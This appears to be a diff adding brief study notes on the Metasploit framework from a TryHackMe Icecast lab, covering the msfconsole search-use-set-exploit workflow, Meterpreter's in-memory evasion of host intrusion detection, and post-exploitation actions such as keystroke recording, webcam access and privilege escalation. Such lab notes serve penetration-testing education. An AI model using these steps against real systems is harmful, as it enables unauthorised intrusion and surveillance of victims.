@@ -1,0 +1,20 @@
+Metasploit framework is a set of tools that allows info. gathering,scanning,exploitation,exploit development,post-exploitation and more.
+CLI -> msfconsole
+Modules: exploits,payloads,scanners...(Core components)
+Tools: Standalone tools that help vuln. assessment or pentesting. Eg:msfvenom
+
+CLI -> sudo msfconsole
+>search <keyword>     //ex:eternal,icecast
+>use 0  //based on above output select value
+>options
+>set LHOST <kali_ip>
+>set RHOSTS <target_ip>
+>exploit  or run 
+
+Meterpreter session: Meterpreter shell is essentially an attack platform that gets injected into memory of running process.Thus it avoids detection by HIDS as well as bypassing the limitations of OS's native command shell.
+The meterpreter can be used to perform different actions on the machine. 
+Eg: Taking SS,get live screen, view webcam and microhone access,record keystrokes,get a shell,privilege escalation
+>help
+THM Icecast Room:
+Find user running the process :-> getuid
+Find build,architecture,OS of Windows is the system :->  sysinfo
